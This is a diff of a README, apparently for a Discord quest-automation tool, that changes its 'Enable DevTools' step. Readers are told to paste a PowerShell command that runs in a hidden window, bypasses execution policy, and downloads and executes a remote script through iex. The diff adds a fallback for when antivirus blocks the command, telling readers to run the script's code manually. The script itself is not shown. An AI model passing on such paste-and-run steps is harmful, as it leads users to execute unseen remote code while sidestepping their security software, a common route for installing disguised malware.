@@ -75,8 +75,10 @@ PLAY_ON_DESKTOP/PLAY_ON_PLAYSTATION/PLAY_ON_XBOX/PLAY_ACTIVITY/..., STREAM_ON_DE
 ### Enable DevTools
 - Win + R and paste:
 ```r
-powershell -w h -ep B -c "iex(iwr https://raw.githubusercontent.com/DiamondRoPlayz/Discord-Quester/main/EnableDevTools.ps1)"
+powershell -w h -ep B -c "iwr https://raw.githubusercontent.com/DiamondRoPlayz/Discord-Quester/main/EnableDevTools.ps1|iex"
 ```
+else ( if anti-virus blocks above. due to strict safety of windows )
+- Open Powershell and run the code from [EnableDevTools.ps1](https://raw.githubusercontent.com/DiamondRoPlayz/Discord-Quester/main/EnableDevTools.ps1)
 #
 <p align="center">
 &#169 Created by DiamondRoPlayz
